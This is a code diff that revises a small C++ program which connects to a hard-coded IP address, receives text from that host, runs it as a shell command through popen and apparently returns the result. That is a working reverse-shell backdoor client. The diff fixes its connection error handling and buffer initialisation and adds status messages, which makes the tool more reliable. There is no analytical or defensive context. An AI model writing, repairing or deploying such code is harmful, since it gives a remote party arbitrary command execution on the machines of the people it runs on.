@@ -4,7 +4,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <cstdlib>
-
+#include <cstring>
 using namespace std;
 
 int main()
@@ -16,12 +16,17 @@ int main()
     string ip="192.168.1.85";
     inet_pton(AF_INET,ip.c_str(),&address.sin_addr);
     int r= connect(server,(struct sockaddr*)&address,sizeof(address));
-    if(r==0)
+    if(r==-1)
     {
+        cout<<"Error Ocurred";
+        close(server);
+    }
+    else
+    {
+        cout<<"Connection Successfull";
         char buffer[4096];
+        memset(buffer, 0, sizeof(buffer));
         int l=recv(server,buffer,4096,0);
-        if(l==0)
-        {
         FILE* p=popen(buffer,"r");
         if(p==nullptr)
         {
@@ -40,20 +45,11 @@ int main()
             close(server);
             exit(1);
         }
-        fclose(p);
-        }
-        else if(l==-1)
+        else
         {
-            cout<<"Listening Error";
-            close(server);
-            exit(1);
+            cout<<"Sending Successfull";
         }
-    }
-    else if(r==-1)
-    {
-        cout<<"Connection Error";
-        close(server);
-        exit(1);
+        fclose(p);
     }
     close(server);
 }
